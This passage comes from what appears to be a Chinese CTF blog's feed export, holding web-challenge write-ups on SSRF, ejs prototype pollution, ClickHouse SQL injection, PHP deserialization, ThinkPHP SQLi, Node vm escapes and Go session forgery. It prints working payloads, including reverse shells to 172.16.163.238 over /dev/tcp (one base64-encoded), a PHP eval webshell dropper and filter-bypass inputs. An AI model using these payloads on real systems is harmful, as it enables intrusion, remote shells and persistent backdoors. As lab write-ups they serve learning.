&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String tartget_url = req.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        String pri = tartget_url.substring(<span class="hljs-number">0</span>, tartget_url.indexOf(<span class="hljs-string">&quot;:&quot;</span>));<br>        <span class="hljs-keyword">if</span> (pri.matches(<span class="hljs-string">&quot;(?i)file|(?i)gopher|(?i)data&quot;</span>)) &#123;<br>            resp.getWriter().write(String.valueOf((<span class="hljs-keyword">new</span> StringBuilder()).append(<span class="hljs-string">&quot;false&quot;</span>)));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            resp.getWriter().write(String.valueOf(<span class="hljs-keyword">this</span>.getContent(tartget_url)));<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> StringBuilder <span class="hljs-title">getContent</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        URL urL = <span class="hljs-keyword">new</span> URL(url);<br>        URLConnection con = urL.openConnection();<br>        BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(con.getInputStream()));<br>        StringBuilder content = <span class="hljs-keyword">new</span> StringBuilder();<br><br>        String inputLine;<br>        <span class="hljs-keyword">while</span>((inputLine = in.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            content.append(inputLine);<br>            content.append(<span class="hljs-string">&quot;n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> content;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>payload：</p><figure class="highlight delphi"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs delphi">url=url:<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag</span><br>或<br>url=<span class="hljs-number">%00</span><span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a3103c40e8dc40a88146d80c99f1eba3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GKcctf</title>
    <link href="/2021/11/01/2021-11-GKCTF2021/"/>
    <url>/2021/11/01/2021-11-GKCTF2021/</url>
    
    <content type="html"><![CDATA[<h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>考点为js弱类型比较，ejs原型链污染rce</p><p>原理参考ejs原型链污染rce</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><p><a href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/</a></p><p>审计源码发现存在</p><p>一个<code>login</code>登录并且有白名单过滤，</p><p>登录后存在token认证</p><p>可以在<code>/addAdmin</code>下添加admin账户</p><p>最后可以在不知道在干啥的<code>adminDIV</code>路由发现原型链污染漏洞，这里的<code>extend</code>方法会将第二个参数<code>JSON.parse(addDIV)</code>压入到第一个参数中，这里还特别用了<code>JSON.parse</code>防止了<code>__proto__</code>被当作原型。</p><p><img src="https://img-blog.csdnimg.cn/977632bb08cc424bb003e551981d48be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>本地测试了一下</p><p><img src="https://img-blog.csdnimg.cn/26570674c40e4f12a198de84f9d7218a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第二个漏洞点在于<code>ejs</code>的模板引擎rce，需要借助第一步的原型链污染实现</p><p><code>&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.163.238 /2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p><p>但是要进入<code>adminDIV</code>需要进行登录，登录中需要绕过白名单，这个考的是js弱类型，数组真的是在任何题目都可能考到的东西，虽然这个点不大，但以后一定要经常记起来这个东西，不然就会卡半天。这里过滤的逻辑是</p><p>在白名单<code>blacklist = [&#39;\\&#39;,&#39;\^&#39;,&#39;)&#39;,&#39;(&#39;,&#39;\&quot;&#39;,&#39;\&#39;&#39;]</code>中遍历，当用户输入中有白名单中的字符则让这个字符变成<code>*</code>。</p><p>这里可以想如果我们输入的参数为一个数组，那么<code>str[i]</code>就是一个字符，则<code>if (waf(str[i]) ==&quot;*&quot;)</code>肯定为false，从而绕过，但是这样进行sql查询时，数组没有substr方法会报错，可以看到if里面还有个拼接操作，在js中数组加上字符串最后结果是一个字符串，所以仍然需要进入if语句中，所以这里的思路就是构造一个数组但是数组里面会含有白名单中的字符。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123;<br>       blacklist = [<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>]<br>       blacklist.forEach(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> &#123;<br>           <span class="hljs-keyword">if</span> (str == element)&#123;<br>               str = <span class="hljs-string">&quot;*&quot;</span>;<br>           &#125;<br>       &#125;);<br>       <span class="hljs-keyword">return</span> str;<br>   &#125;<br><br>   <span class="hljs-keyword">const</span> safeStr = <span class="hljs-function">(<span class="hljs-params">str</span>)=&gt;</span>&#123; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;i &lt; str.length;i++)&#123;<br>       <span class="hljs-keyword">if</span> (waf(str[i]) ==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>           <br>           str =  str.slice(<span class="hljs-number">0</span>, i) + <span class="hljs-string">&quot;*&quot;</span> + str.slice(i + <span class="hljs-number">1</span>, str.length);<br>       &#125;<br>       <br>   &#125;<br></code></pre></div></td></tr></table></figure><p>构造payload，这里username长度得足够因为后面还有substr方法</p><p><code>username[]=admin&#39;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=123456    </code></p><p>这样最后结果就是</p><p><img src="https://img-blog.csdnimg.cn/441ad71931b54ccea4d23a414367b0b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>改包发送得到token</p><p><img src="https://img-blog.csdnimg.cn/8cf203044c9a4c2cbb17df42d85c0a4d.png" alt="在这里插入图片描述"></p><p>用得到的token添加admin用户，注意让添加的用户名为<code>__proto__</code>，然后用添加成功的admin用户登录然后进行原型污染。用新用户登录中直接登录就不行，非得用hackbar，真不知道为啥。</p><p><img src="https://img-blog.csdnimg.cn/dc3867f9e44d49818444c4a2481d99fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>拿到新用户token后进行原型链污染，然后访问admin页面进入 ejs 渲染引擎getshell，buu内网靶机监听。</p><p><code>data=&#123;&#39;__proto__&#39;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xNjMuMjM4LzIzMzMgMD4mMQo= | base64 -d | bash&#39;);var __tmp2&quot;&#125;&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>字节跳动</title>
    <link href="/2021/11/01/2021-10-bytectf%E5%88%9D%E8%B5%9B/"/>
    <url>/2021/11/01/2021-10-bytectf%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Double-Sqli"><a href="#Double-Sqli" class="headerlink" title="Double Sqli"></a>Double Sqli</h2><p>本菜鸡做了很长时间才唯一做出来的一道题。报错可以发现是clickhouse数据库，查看文档可以查数据库，表等</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">&#x2F;?id&#x3D;-1 union all select name from system.databases--+<br></code></pre></div></td></tr></table></figure><p>最后读到hint,提示需要提权。</p><p><img src="https://img-blog.csdnimg.cn/f452ef603b2e4e269037545b674e9e24.png" alt="在这里插入图片描述"></p><p>这里需要发现一个 nginx 目录穿越</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">在 <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/clickhouse/</span>access/xxxx.sql 中发现了数据库中还有一个 user_01 用户，其密码为 e3b0c44298fc1c149afb<br></code></pre></div></td></tr></table></figure><p>这里肯定是用<code>user_01</code>的权限读取flag，后面发现可以用<code>url()</code>函数ssrf打它本地的clickhouse</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br>test = <span class="hljs-string">&#x27;http://39.105.175.150:30001&#x27;</span><br>param = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;-1 union all select * FROM url(&#x27;http://localhost:8123?user=user_01&amp;password=e3b0c44298fc1c149afb&amp;query=select+flag+from+flag&#x27;,&#x27;CSV&#x27;,&#x27;column1 String&#x27;)&quot;</span><br>&#125;<br><br>res = requests.get(test,params=param)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></div></td></tr></table></figure><h1 id="Unsecure-Blog"><a href="#Unsecure-Blog" class="headerlink" title="Unsecure Blog"></a>Unsecure Blog</h1><p>万恶的java题目，感觉java虽然很严谨但真的很难。</p><h1 id="easy-extract"><a href="#easy-extract" class="headerlink" title="easy_extract"></a>easy_extract</h1><h1 id="sp-oauth"><a href="#sp-oauth" class="headerlink" title="sp-oauth"></a>sp-oauth</h1>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绿城杯</title>
    <link href="/2021/10/30/2021-10-%E7%BB%BF%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/10/30/2021-10-%E7%BB%BF%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Looking-for-treasure"><a href="#Looking-for-treasure" class="headerlink" title="Looking for treasure"></a>Looking for treasure</h1><p>json-schema原型链</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">POST /validated/json-schema/validate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br>&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天翼杯复现</title>
    <link href="/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/10/10/2021-10-%E5%A4%A9%E7%BF%BC%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h1><p>进入首先是一个反序列化加绕过，这里可以用大小写绕过和基类绕过，wakeup改属性就行</p><p>将正常payload</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>改为</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:64:&quot;file_put_contents(&#39;./shell.php&#39;,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;);&quot;;&#125;&#125;</code></p><p>网上一些师傅还提供了基类的绕过</p><p><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;test&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</code></p><p>还可以省略末尾的大括号,call提到wakeup前绕过</p><p><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p><p>用蚁剑脸上之后终端是没有命令权限的，但是可以看到swp文件，vim看一下发现和redis数据库有关，并且给了密码。</p><p><img src="https://img-blog.csdnimg.cn/caa0927d818f4571ad43437ddffd911d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>开启了redis就很显然了，用给的密码认证连接redis，上传.so文件，moudle加载执行命令即可。</p><h1 id="Eztp"><a href="#Eztp" class="headerlink" title="Eztp"></a>Eztp</h1><p>thinkPHP源码审计，考的是5.0.4版本<code>select</code>方法漏洞</p><p>原理可参考<a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83</a></p><p>这里简单复现了一下漏洞，入口index代码如下。ThinkPHP5.0版本默认的变量修饰符是<code>/s</code>，这里<code>/a</code>意思是如果你要获取的数据为数组，需要用<code>/a</code>才能转换</p><p><img src="https://img-blog.csdnimg.cn/9603ff8a29f94539ad8cd57823366ddb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>先进行数据库初始化，然后进入<code>where</code>函数</p><p><img src="https://img-blog.csdnimg.cn/302b8ff89f6a4278a45f7999de060b6d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>出where方法后<code>$options</code>里多了两个数组。</p><p>之后进入关键的<code>select</code>函数，关键在生成sql语句的过程。在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。我们跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://img-blog.csdnimg.cn/3cd95db4dd724a4287e5f43090fa5f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>漏洞产生地方在于检测操作符的过程,这里可以看到检测。当<code>$this-&gt;exp[$exp]</code>中含有<code>not like</code>时会将用户控制的变量直接进行赋值。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212308025.png" alt="image-20211011212308025"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211011212902036.png" alt="image-20211011212902036"></p><p>后面就构造成了我们想要的payload，拿一张网上的图</p><p><img src="https://mochazz.github.io/img/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A54/7.png" alt="img"></p><blockquote><p>正是由于 <strong>ThinkPHP</strong> 官方的 <strong>filterValue</strong> 方法漏过滤了 <strong>NOT LIKE</strong> ，同时 <strong>MYSQL</strong> 逻辑操作由用户变量控制，使得这一漏洞可以被利用。</p></blockquote><p>攻击结果</p><p><img src="https://img-blog.csdnimg.cn/569aadf8084f433e89fbeb72899d15d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但是nss靶场的题目环境似乎有点问题，注入进不到后台。直接看后面的反序列化吧</p><p>参考：<a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs</title>
    <link href="/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/"/>
    <url>/2021/10/08/2021-10-nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8(1)/</url>
    
    <content type="html"><![CDATA[<h3 id="沙箱机制"><a href="#沙箱机制" class="headerlink" title="沙箱机制"></a>沙箱机制</h3><p>沙箱机制简单来讲是一个隔离得虚拟环境，能够独立的在这个虚拟环境内运行代码，但是不会影响外界代码，能够屏蔽上下文，隔离当前的执行环境，避免被恶意代码攻击。</p><p>日常开发需求中有时候为了追求灵活性或降低开发难度，会在业务代码里直接使用 eval/Function/vm 等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，会存在安全问题。 node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击，但实际上vm沙箱也存在安全漏洞。</p><h1 id="vm沙箱"><a href="#vm沙箱" class="headerlink" title="vm沙箱"></a>vm沙箱</h1><p>VM模块包含了三个常用的方法，用于创建独立运行的沙箱体制，如下三个方法：</p><p><code>vm.runInContext,vm.runInNewContext,vm.runInThisContext</code></p><p>此方法用于创建一个独立的沙箱运行空间，code内的代码可以访问外部的global对象，但是不能访问其他变量.而且code内部global与外部共享</p><p><img src="https://img-blog.csdnimg.cn/20190320113225298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZlbmdkaWppYW5n,size_16,color_FFFFFF,t_70" alt="img"></p><p>具体可以看看文档<a href="http://nodejs.cn/api/vm.html">http://nodejs.cn/api/vm.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先看一下简单的逃逸</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;goin&#x27;</span>);<br>vm.runInContext(<span class="hljs-string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;out&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>上述代码在第三行结束了主程序运行，并且报错。</p><p><img src="https://img-blog.csdnimg.cn/7688fc4098534439857382179e98c1a2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><p>参考：<a href="https://prontosil.top/posts/9c09dcd4/">https://prontosil.top/posts/9c09dcd4/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯java</title>
    <link href="/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/"/>
    <url>/2021/10/07/2021-10-%E7%A5%A5%E4%BA%91%E6%9D%AFjava/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>javaweb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯</title>
    <link href="/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/09/30/2021-10-%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="checkin-go"><a href="#checkin-go" class="headerlink" title="checkin_go"></a>checkin_go</h1><p>go框架第一次遇到。搭了下go环境顺便学了一下基本语法。</p><p>审计源码可以发现，出题人用了<code>gin</code>框架，启用了基于cookie的session。mian函数里面加了几个路由，审计一下关键的中间件处理。</p><p><img src="https://img-blog.csdnimg.cn/dcd4373cc1b44431b97916d9b15cf51a.png" alt="在这里插入图片描述"></p><p>​    </p><p>默认界面需要登录和经典绕过hash验证。但这里很奇怪，不能admin登录但后面需要以admin身份买flag。所以这里的思路是伪造session。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20210922190932821.png" alt="image-20210922190932821"></p><p>伪造session可行还有一个原因就是go语言下<code>math/rand</code>库中rand函数如果没有指定密钥，只是指定了输出长度，默认的输出结果是一样的，所以这里可以在本地跑源码拿cookie来进行伪造。下一关就是买flag，但是自己只有5000，买flag要两万，这里两个思路，一个是整数溢出将flag价格减为0，另一个是在本地将<code>checkNowMoney</code>设置等于<code>checkPlayerMoney</code>，然后拿cookie。</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-comment">//伪造cookie</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;math/rand&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span><br><span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>storage := cookie.NewStore(randomChar(<span class="hljs-number">16</span>))<br>r.Use(sessions.Sessions(<span class="hljs-string">&quot;o&quot;</span>, storage))<br>r.GET(<span class="hljs-string">&quot;/a&quot;</span>, cookieHandler)<br>r.Run(<span class="hljs-string">&quot;127.0.0.1:20702&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// func cookieHandler(c *gin.Context) &#123;</span><br><span class="hljs-comment">// s := sessions.Default(c)</span><br><span class="hljs-comment">// s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">// s.Save()</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">cookieHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>s := sessions.Default(c)<br><span class="hljs-comment">//s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;uname&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;nowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;nowMoney&quot;</span>, <span class="hljs-number">5000</span>)<br><span class="hljs-comment">//fmt.Println(s.Get(&quot;playerMoney&quot;))</span><br><span class="hljs-comment">//fmt.Println(s.Get(&quot;checkNowMoney&quot;))</span><br>s.Set(<span class="hljs-string">&quot;checkNowMoney&quot;</span>, s.Get(<span class="hljs-string">&quot;checkPlayerMoney&quot;</span>))<br><span 